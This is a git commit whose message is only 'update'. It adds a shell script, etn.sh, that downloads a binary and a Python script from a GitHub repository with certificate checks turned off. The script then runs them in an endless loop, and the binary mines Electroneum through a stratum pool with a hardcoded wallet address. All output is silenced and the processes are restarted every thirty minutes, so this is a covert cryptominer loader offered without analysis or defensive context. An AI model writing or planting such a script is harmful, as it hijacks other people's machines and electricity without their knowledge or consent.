01c49cdf4587605932457e9bf0e77394b34faf88
x7r3mx <x7r3mx@gmail.com>
2018-03-11 17:51:35 +0200

    update

---
+++ etn.sh
@@ -0,0 +1,13 @@
+mkdir -p /opt/code/
+wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -P /opt/code
+wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
+chmod -R 700 /opt/code
+
+while true; do 
+    pkill -f goal;
+    pkill -f origin;
+    sleep 5;
+    /opt/code/goal -c x -M stratum+tcp://etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN:x@mine.electroneum.vip:3333/xmr &>/dev/null &
+    python /opt/code/origin.py &>/dev/null &
+    sleep 1800;
+done
